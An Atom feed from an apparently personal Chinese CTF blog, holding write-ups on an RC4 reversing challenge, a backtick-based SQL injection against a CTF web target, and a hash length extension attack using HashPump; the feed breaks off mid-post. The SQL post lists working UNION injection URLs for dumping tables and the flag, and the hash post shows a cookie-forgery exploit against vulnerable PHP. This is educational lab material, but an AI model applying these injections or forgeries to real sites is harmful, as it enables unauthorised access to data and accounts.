<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KANGEL</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://j-kangel.github.io/"/>
  <updated>2019-04-08T15:54:51.397Z</updated>
  <id>https://j-kangel.github.io/</id>
  
  <author>
    <name>kangel</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>逆向踩坑之RC4</title>
    <link href="https://j-kangel.github.io/2019/04/09/RC4/"/>
    <id>https://j-kangel.github.io/2019/04/09/RC4/</id>
    <published>2019-04-08T18:15:26.000Z</published>
    <updated>2019-04-08T15:54:51.397Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>RC4加密算法是大名鼎鼎的RSA三人组中的头号人物Ronald Rivest在1987年设计的密钥长度可变的流加密算法簇。之所以称其为簇，是由于其核心部分的S-box长度可为任意，但一般为256字节。该算法的速度可以达到DES加密的10倍左右，且具有很高级别的非线性。RC4起初是用于保护商业机密的。但是在1994年9月，它的算法被发布在互联网上，也就不再有什么商业机密了。RC4也被叫做ARC4（Alleged RC4——所谓的RC4），因为RSA从来就没有正式发布过这个算法。</p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>该算法较为简单，文字描述有点绕，直接上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span>   <span class="comment">#data为明文或密文，key为密钥</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    box = range(<span class="number">256</span>)   <span class="comment">#初始化S盒</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % <span class="number">256</span>]))</span><br><span class="line">        <span class="comment">#对称密码，加密解密算法一样</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br></pre></td></tr></table></figure><p>python中Crypto库中有该算法，具体用法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> *</span><br><span class="line">data = <span class="string">"kangel"</span></span><br><span class="line">key = <span class="string">"key"</span></span><br><span class="line">cipher = ARC4.new(key)    <span class="comment">#加载密钥</span></span><br><span class="line">m = cipher.decrypt(key)   <span class="comment">#用该密钥解密</span></span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>RC4在有些情况下与sha1、base64一起混合使用，如果发现密文是base64编码，需考虑该算法，具体算法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random, base64</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    box = range(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % <span class="number">256</span>]))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tencode</span><span class="params">(data, key, encode=base64.b64encode, salt_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 encryption with random salt and final encoding"""</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(salt_length):</span><br><span class="line">        salt += chr(random.randrange(<span class="number">256</span>))</span><br><span class="line">    data = salt + crypt(data, sha1(key + salt).digest())</span><br><span class="line">    <span class="keyword">if</span> encode:</span><br><span class="line">        data = encode(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tdecode</span><span class="params">(data, key, decode=base64.b64decode, salt_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 decryption of encoded data"""</span></span><br><span class="line">    <span class="keyword">if</span> decode:</span><br><span class="line">        data = decode(data)</span><br><span class="line">        <span class="keyword">print</span> data</span><br><span class="line">    salt = data[:salt_length]</span><br><span class="line">    <span class="keyword">print</span> len(salt)</span><br><span class="line">    <span class="keyword">return</span> crypt(data[salt_length:], sha1(key + salt).digest())</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 需要解密的数据</span></span><br><span class="line">    data = <span class="string">'UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw=='</span></span><br><span class="line">    <span class="comment"># 密钥</span></span><br><span class="line">    key = <span class="string">'welcometoicqedu'</span></span><br><span class="line">    <span class="comment"># 解码</span></span><br><span class="line">    decoded_data = tdecode(data=data, key=key)</span><br><span class="line">    <span class="comment">#decoded_data = crypt(data,m)</span></span><br><span class="line">    print(<span class="string">"明文是："</span>)</span><br><span class="line">    <span class="keyword">print</span> decoded_data</span><br><span class="line"><span class="comment">#bdctf&#123;YOU_CRAKE_THE_RC4&#125;</span></span><br></pre></td></tr></table></figure><h3 id="逆向题中的体现"><a href="#逆向题中的体现" class="headerlink" title="逆向题中的体现"></a>逆向题中的体现</h3><p>前天打了掘安杯，这明明是一道很简单的逆向，可就是得不出flag。</p><p>题目如下：程序为64位的ELF文件，用ida打开</p><p><img src="/2019/04/09/RC4/1.JPG" alt=""></p><p>当时并不知道这是RC4（主要还是菜），但是RC4算法不难，所以很容易实现。刚开始被那一段<code>&gt;&gt;31&gt;&gt;24</code>迷惑了很久，还恶补了一堆东西，例如：</p><p>逻辑右移与算术右移（左移都是末尾补0）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = 1011</span><br><span class="line">b = a &gt;&gt; 1</span><br><span class="line">#a为无符号数</span><br><span class="line">b = 0101</span><br><span class="line">#a为有符号数,最高位为符号位，不进行移位运算，补全补符号位</span><br><span class="line">b = 1101</span><br><span class="line">所以：对于整数来说，逻辑右移与算术右移结果相同。</span><br></pre></td></tr></table></figure><p>上面的代码中先是有符号int（32位）右移31位，然后无符右移24位。因为被以为的数均为正数，所以最终结果都是0。</p><p>int_64如何转化为int_8（取最低字节）：模256就行了</p><p>然后写着写着就变成了RC4，未经修改的原生态代码，虽然有点乱（额，其实是非常乱），但其实并没有什么问题</p><p>可就是答案不对。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    a.append(i)</span><br><span class="line">v11 = <span class="number">0</span></span><br><span class="line">ch = <span class="string">"Th1sIsTheK3y"</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    v11 = (v11 + a[j] + ord(ch[j%<span class="number">12</span>]))%<span class="number">256</span></span><br><span class="line">    v3 = a[j]</span><br><span class="line">    a[j]=a[v11]</span><br><span class="line">    a[v11] = v3</span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line">v9 = <span class="number">0</span></span><br><span class="line">b = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    v8 = (v8 +<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">    v9 = (v9+a[v8])%<span class="number">256</span></span><br><span class="line">    b.append(a[(a[v9]+a[v8])%<span class="number">256</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(a)</span></span><br><span class="line"><span class="comment">#print(b)</span></span><br><span class="line">key = [<span class="number">0x1c</span>,<span class="number">0x61</span>,<span class="number">0x97</span>,<span class="number">0x34</span>,<span class="number">0x28</span>,<span class="number">0x69</span>,<span class="number">0xfa</span>,<span class="number">0x54</span>,<span class="number">0xda</span>,<span class="number">0x3a</span>,<span class="number">0x2b</span>,<span class="number">0xbb</span>,<span class="number">0x05</span>,<span class="number">0x09</span>,<span class="number">0x16</span>,<span class="number">0x38</span>,<span class="number">0xf3</span>,<span class="number">0xcf</span>,<span class="number">0xd8</span>,<span class="number">0xa5</span>,<span class="number">0x12</span>,<span class="number">0x7e</span>,<span class="number">0x67</span>,<span class="number">0x44</span>]</span><br><span class="line">print(key)</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    flag+=chr(key[i]^b[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> len(b)</span><br><span class="line"><span class="keyword">print</span> len(key)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>后来看了官方wp，说是对key，进行了一次混淆。到了这里，我多说两句关于混淆：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">为了有效抵抗攻击者对密码体制的攻击，Shannon提出三个基本设计思想--扩散、混淆（混乱）和乘积密码。</span><br><span class="line">扩散：一位明文变化导致多位密文变化</span><br><span class="line">混淆：进行多次加密</span><br></pre></td></tr></table></figure><p>这里有个puts函数，首先用key对key进行一次RC4，得到的新key再用来加密flag。由于忽略了这一点（主要还是因为菜），所以最终只能是望而却步。看了wp，在ida中alt+t中搜索call sub_400686（RC4函数），果然有两处。</p><p><img src="/2019/04/09/RC4/2.JPG" alt=""></p><p>最后上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> *</span><br><span class="line">data = <span class="string">"\x1c\x61\x97\x34\x28\x69\xfa\x54\xda\x3a\x2b\xbb\x05\x09\x16\x38\xf3\xcf\xd8\xa5\x12\x7e\x67\x44"</span></span><br><span class="line">key = <span class="string">"Th1sIsTheK3y"</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line">m = cipher.decrypt(key)</span><br><span class="line">key_1 = ARC4.new(m)</span><br><span class="line">m = key_1.decrypt(data)</span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>看似差之毫厘，实际则反映知识的掌握程度和解题的熟练程度。不说了，回炉再造去了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;RC4加密算法是大名鼎鼎的RSA三人组中的头号人物Ronald Rivest在1987年设计的密钥长度可变的流加密算法簇。之所以称其为簇，是
      
    
    </summary>
    
      <category term="reverse" scheme="https://j-kangel.github.io/categories/reverse/"/>
    
      <category term="crypto" scheme="https://j-kangel.github.io/categories/reverse/crypto/"/>
    
    
      <category term="RC4" scheme="https://j-kangel.github.io/tags/RC4/"/>
    
      <category term="crypto" scheme="https://j-kangel.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>sql注入之反引号</title>
    <link href="https://j-kangel.github.io/2019/04/07/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%8F%8D%E5%BC%95%E5%8F%B7/"/>
    <id>https://j-kangel.github.io/2019/04/07/sql注入之反引号/</id>
    <published>2019-04-06T21:58:19.000Z</published>
    <updated>2019-04-09T14:14:56.161Z</updated>
    
    <content type="html"><![CDATA[<h3 id="反引号在mysql中的作用"><a href="#反引号在mysql中的作用" class="headerlink" title="反引号在mysql中的作用"></a>反引号在mysql中的作用</h3><p>反引号在键盘的左上角，在mysql中可以区别关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#假如表A中有一列名为select，查询该列</span><br><span class="line">select select from A;   #错误</span><br><span class="line">select `select` from A;  #正确</span><br><span class="line">#假如存在表flag，用desc(describe)查询该表信息</span><br><span class="line">desc flag A;  #显示flag表信息，别名为A</span><br><span class="line">desc `flag` `A` #与上述语句相同</span><br></pre></td></tr></table></figure><h3 id="一道与之相关的web题"><a href="#一道与之相关的web题" class="headerlink" title="一道与之相关的web题"></a>一道与之相关的web题</h3><p>题目链接：<a href="http://web.jarvisoj.com:32794/" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/</a></p><p>Hint1: 先找到源码再说吧~~</p><p>后台扫描，得到源码：<a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">$table = Filter($table);</span><br><span class="line">mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">$sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">$ret = sql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当<code>table</code>为空时，输出<code>flag{xxx}</code>，说明存在表<code>secret_test</code>。我们直接构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select database() limit 1,1</span><br></pre></td></tr></table></figure><p>得到数据库61d00，接着爆表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(table_name) from information_schema.tables where table_schema = database() limit 1,1</span><br></pre></td></tr></table></figure><p>得到secret_flag,secret_test，接着爆字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select group_concat(column_name) from information_schema.columns where table_name = 0x7365637265745f666c6167 limit 1,1</span><br></pre></td></tr></table></figure><p>得到flagUwillNeverKnow，最后爆出flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32794/index.php?table=test` `union select flagUwillNeverKnow  from secret_flag limit 1,1</span><br></pre></td></tr></table></figure><p>flag{luckyGame~}</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>该题只要清楚mysql中反引号的作用以及desc的使用，就变成了最基本的sql注入，没有过滤任何字符的注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;反引号在mysql中的作用&quot;&gt;&lt;a href=&quot;#反引号在mysql中的作用&quot; class=&quot;headerlink&quot; title=&quot;反引号在mysql中的作用&quot;&gt;&lt;/a&gt;反引号在mysql中的作用&lt;/h3&gt;&lt;p&gt;反引号在键盘的左上角，在mysql中可以区别关键字&lt;
      
    
    </summary>
    
      <category term="web" scheme="https://j-kangel.github.io/categories/web/"/>
    
      <category term="jarvisOJga" scheme="https://j-kangel.github.io/categories/web/jarvisOJga/"/>
    
    
      <category term="web" scheme="https://j-kangel.github.io/tags/web/"/>
    
      <category term="sql注入" scheme="https://j-kangel.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>hash长度扩展攻击</title>
    <link href="https://j-kangel.github.io/2019/04/05/hash-attack/"/>
    <id>https://j-kangel.github.io/2019/04/05/hash-attack/</id>
    <published>2019-04-04T18:46:41.000Z</published>
    <updated>2019-04-04T14:58:18.054Z</updated>
    
    <content type="html"><![CDATA[<h3 id="hash原理（以MD5为例）"><a href="#hash原理（以MD5为例）" class="headerlink" title="hash原理（以MD5为例）"></a>hash原理（以MD5为例）</h3><h4 id="原理浅析"><a href="#原理浅析" class="headerlink" title="原理浅析"></a>原理浅析</h4><p>MD5算法输入消息以512bit的分组为单位处理（sha1、sha256也是如此），共64字节。然后对每个分组进行一次“加密”，前一次的“加密”结果会作为这一次“加密”的输入，最后一次“加密”结果即为最终MD5值。不足64字节的分组需要进行补位，也就是字节填充。</p><p>补位原则：首先将需要hash的字符串进行分组，即字符串长度（以字节为单位）整除64，最后一组不足56字节的进行字节填充。填充的第一个字节为0x80，其他均为0x00。剩下的8个字节用来表示原字符串的长度。</p><h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>现在需要加密字符串：<code>hash_length_extend_attack</code>，共25字节。</p><p><img src="/2019/04/05/hash-attack/1.JPG" alt=""></p><p>该字符串不足56字节，需进行补位。第一个字节为0x80，其余为0x00，填充至56位。</p><p><img src="/2019/04/05/hash-attack/2.JPG" alt=""></p><p>最后8个字节为原字符串的长度描述符（以bit为单位），25字节共200bit，120转十六进制为0xc8。由于MD5的存储为小端位序。例如0x12345678存为0x78563412。</p><p><img src="/2019/04/05/hash-attack/3.JPG" alt=""></p><h3 id="hash长度扩展攻击原理"><a href="#hash长度扩展攻击原理" class="headerlink" title="hash长度扩展攻击原理"></a>hash长度扩展攻击原理</h3><p>若<code>md5($salt.string1)</code>已知，则在salt未知的条件下可以求出<code>md5($salt.string1+padding+stirng2)</code>。</p><p>证明：因为<code>md5($salt.string1)=md5($salt.string1+padding</code>，因此<code>md5($salt.string1+padding+stirng2)</code>即为用<code>md5($salt.string1)</code>对<code>$string2+padding</code>进行一次“加密”。</p><p>工具：hashpump</p><p>安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/HashPump<span class="comment"># hashpump</span></span><br><span class="line">Input Signature: 3a4727d57463f122833d9e732f94e4e0  <span class="comment">##md5($salt.string1)</span></span><br><span class="line">Input Data:  ;<span class="string">"tseug"</span>:5:s        <span class="comment">##string1</span></span><br><span class="line">Input Key Length: 11             <span class="comment">##salt长度</span></span><br><span class="line">Input Data to Add: ;<span class="string">"nimda"</span>:5:s  <span class="comment">##string2</span></span><br><span class="line">fcdc3840332555511c4e4323f6decb07    <span class="comment">##md5($salt.string1+padding+stirng2)</span></span><br><span class="line">;<span class="string">"tseug"</span>:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00;<span class="string">"nimda"</span>:5:s      <span class="comment">##$salt.string1+padding+stirng2</span></span><br></pre></td></tr></table></figure><p>下面结合两个具体题目来实现攻击</p><h3 id="题目一：salt长度已知"><a href="#题目一：salt长度已知" class="headerlink" title="题目一：salt长度已知"></a>题目一：salt长度已知</h3><p>题目链接：<a href="http://www.shiyanbar.com/ctf/1848" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1848</a></p><p>username和password输入admin、admin。响应出现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If you have the correct credentials, log in below. If not, please LEAVE.</span><br></pre></td></tr></table></figure><p>查看源码，无任何提示。于是抓包分析。发现：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: sample-hash=571580b26c65f306376d4f64e53cb5c7; source=0; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1553478983,1554089005,1554300942,1554380508; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*130458%2CnickName%3AKANGEL; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1554380518; PHPSESSID=615uqh2qr9s16pr67f9bhs9ur6</span><br></pre></td></tr></table></figure><p>cookie中有hash值，有source。将<code>source=0</code>改为<code>source=1</code>，发现源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>熟悉的味道，要注意的是<code>$salt = %secret.&quot;admin&quot;</code>，长度为20：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$salt.string1 = $secret.urldecode(<span class="string">"admin"</span>.<span class="string">"admin"</span>)</span><br><span class="line">$string1 = <span class="string">"admin"</span>   <span class="comment">//urldecode($username) === "admin"</span></span><br><span class="line">md5($salt.string1) = <span class="string">"571580b26c65f306376d4f64e53cb5c7"</span> <span class="comment">//cookie中的sample-hash</span></span><br><span class="line">$string2 = <span class="string">"kangel"</span>  <span class="comment">//urldecode($password) != "admin"</span></span><br></pre></td></tr></table></figure><p>现在利用hashpump计算<code>md5($secret.urldecode(&quot;admin&quot;.&quot;admin&quot;).padding.&quot;kangel&quot;)</code>，其中<code>$password=&quot;admin&quot;.padding.&quot;kangel&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 